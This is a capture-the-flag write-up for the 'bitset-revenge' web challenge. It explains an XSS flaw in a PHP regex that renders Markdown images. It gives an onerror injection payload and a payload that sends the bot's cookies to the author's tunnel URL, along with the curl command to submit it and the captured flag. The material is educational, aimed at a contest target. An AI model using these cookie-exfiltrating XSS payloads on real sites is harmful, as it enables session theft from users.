---
title: bitset-revenge
challenge_type: Web
author: "@rewhile @bawolff @yuu"
writeup_author: "@xabito"
competition: infobahn-ctf-2025
summary: |-
  bitset made an image-sharing website, go share some cool images with her!
connections:
  - url: https://bitset-revenge-web.challs3.infobahnc.tf
attachments:
  - title: bitset-revenge.zip
    url: /assets/files/infobahn-ctf-2025/bitset-revenge/bitset-revenge.zip
---

**Note:** This writeup is the first part of the `bitset` challenge series. In this revenge challenge, a fix has been implemented to prevent the unintended solution described in [bitset](/competitions/infobahn-ctf-2025/bitset/). The second and third parts of the series are [bitsets-revenge](/competitions/infobahn-ctf-2025/bitsets-revenge/) and [bitsetsy-revenge](/competitions/infobahn-ctf-2025/bitsetsy-revenge/), respectively.

## Recon

The website allows users to submit an image URL, which is then displayed on the site. Reviewing the source code reveals that the application is served by a Bun server, which proxies all requests to a PHP server except for those directed to the `/bot` endpoint.

![Landing page](/assets/files/infobahn-ctf-2025/bitset-revenge/website.png)

Let's examine the `/bot` endpoint. When you send a URL to this endpoint, the server uses Puppeteer to launch a browser instance that visits the provided website. Before navigating to the site, the server sets a cookie in the browser. In order to obtain the flag, we need to retrieve this cookie, which means we must interact with the website through the server controlled browser.

```javascript
const q = u.searchParams.get("url") || "";
if (!q) return new Response("url required >:(", { status: 400 });
if (!/^https?:\/\/.+/i.test(q)) return new Response("url must start with http(s)://", { status: 400 });
const bot = `http://127.0.0.1:6969/?url=${encodeURIComponent(q)}`;
const b = await puppeteer.launch({
  executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || "/usr/bin/chromium",
  args: ["--no-sandbox", "--js-flags=--noexpose_wasm,--jitless"],
});
try {
  const p = await b.newPage();
  p.setDefaultTimeout(10000);
  await b.setCookie({
    name: "flag",
    value: process.env.FLAG1 || "infobahn{fake_flag1}",
    domain: "127.0.0.1",
    path: "/",
  });
  ...
}
u.protocol = "http:";
u.host = "127.0.0.1:6969";
const r = await fetch(u, { method: req.method, headers: req.headers, body: req.body, redirect: "manual" });
return new Response(r.body, { status: r.status, headers: r.headers });
```

Even before reviewing the PHP server code, it appears likely that the website contains an XSS vulnerability that must be exploited to exfiltrate the cookie to a server we control. Examining the source code confirms that exploiting XSS is the intended method to solve the challenge, although successfully crafting the exploit is not straightforward.

```php
function render_img_markdown(string $s): string {
  return preg_replace(
    '/!\[ \]\(([^)\r\n]*)\)/',
    "<img src='$1' loading='lazy'>",
    htmlspecialchars('![ ](' . $s . ')', ENT_HTML5, 'UTF-8')
  );
}
```

```html
<div><?= render_img_markdown($url) ?></div>
```

## Exploitation

User input is validated in an unusual way. First, any HTML characters in the input are escaped. The escaped URL is then placed into a Markdown image syntax (`![ ](URL)`). Afterwards, a regular expression is used to extract the URL from this Markdown, and an `<img>` element is generated using the result. Clearly, the vulnerability arises from how the regular expression processes the string.

At first glance, the regular expression extracts all content within the parentheses, stopping at either a newline or a closing parenthesis. However, it does not require the closing parenthesis to appear at the end of the string. This oversight allows us to inject additional code after the `<img>` tag is generated.

By beginning our payload with `http://'x=")`, we can manipulate the rendering so that part of the tag, specifically the `loading='lazy'>`, is interpreted as part of a new attribute (`x`) within the `<img>` element, preventing the tag from being closed as intended. Then, by adding another `"` in our payload, we can terminate the forged attribute and inject further attributes into the image tag.

Let's try adding an `onerror` attribute that allows us to write JavaScript, so that we can test our hypothesis and define our final payload from here. Our starting payload will be:

```
http://'x=")"onerror='alert(1)'
```

![XSS Payload](/assets/files/infobahn-ctf-2025/bitset-revenge/xss.png)

Great! Now that we have the ability to execute JavaScript, we can exfiltrate the document cookies by sending them to a server we control. To set up an internet-accessible HTTP listener, we can use a simple Python HTTP server alongside [Tunnelmole](https://tunnelmole.com/):

```bash
$ python3 -m http.server 8080 &

$ tmole 8080
Your Tunnelmole Public URLs are below and are accessible internet wide. Always use HTTPs for the best security
https://8e8rqk-ip-1-2-3-4.tunnelmole.net ⟶   http://localhost:8080
http://8e8rqk-ip-1-2-3-4.tunnelmole.net ⟶   http://localhost:8080
```

By submitting the following payload to the `/bot` endpoint, we can make the bot visit the vulnerable page. When the browser processes the page, our injected `onerror` payload will execute and redirect the browser to our server, allowing us to capture the exfiltrated data.

```
http://'x=")"onerror='location=`http://8e8rqk-ip-1-2-3-4.tunnelmole.net/?${document.cookie}`' 
```

```bash
$ PAYLOAD="http://'x=\")\"onerror='location=\`http://8e8rqk-ip-1-2-3-4.tunnelmole.net/?\$\{document.cookie\}\`'"

$ curl "https://bitset-revenge-web.challs3.infobahnc.tf/bot?url=${PAYLOAD}"
Cool image (●'◡'●)
```

## Flag capture

Once the bot has visited our payload, we can check the logs of our Python server to obtain the flag:

```
[200 OK] GET /?flag=infobahn{wE_wi5H3d_Th@7_y0u_REaD_7he_php_DOCs} Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/142.0.0.0 Safari/537.36```
[404 Not Found] GET /favicon.ico Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/142.0.0.0 Safari/537.36
```

```
Flag: infobahn{wE_wi5H3d_Th@7_y0u_REaD_7he_php_DOCs}
```